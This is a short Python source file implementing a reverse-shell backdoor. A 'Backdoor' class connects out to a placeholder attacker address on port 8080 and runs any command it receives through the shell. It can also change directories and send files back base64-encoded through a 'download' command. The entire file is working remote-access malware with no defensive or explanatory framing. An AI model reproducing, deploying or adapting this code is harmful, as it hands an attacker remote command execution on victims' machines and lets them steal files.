import socket
import subprocess
import os
import json
import base64
os.system("chcp 65001")


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def cd(self, path):
        os.chdir(path)
        wd = os.getcwd()
        return f"[+] working directory: {wd}"

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data += (self.connection.recv(1024)).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def command_executor(self, command):
        try:
            return str(subprocess.check_output(command, shell=True))
        except subprocess.CalledProcessError:
            return "wrong command"

    def run(self):
        while True:
            command = (self.reliable_recv())
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and (len(command) > 1):
                output = self.cd(command[1])
                self.reliable_send(output)
            elif command[0] == "download":
                output = self.read_file(command[1])
                self.reliable_send(output)
            else:
                output = self.command_executor(command)
                self.reliable_send(output)

    def read_file(self, path):
        with open(path, "rb") as file:
            return (base64.b64encode(file.read())).decode()


bd = Backdoor("ip-address", 8080)
bd.run()
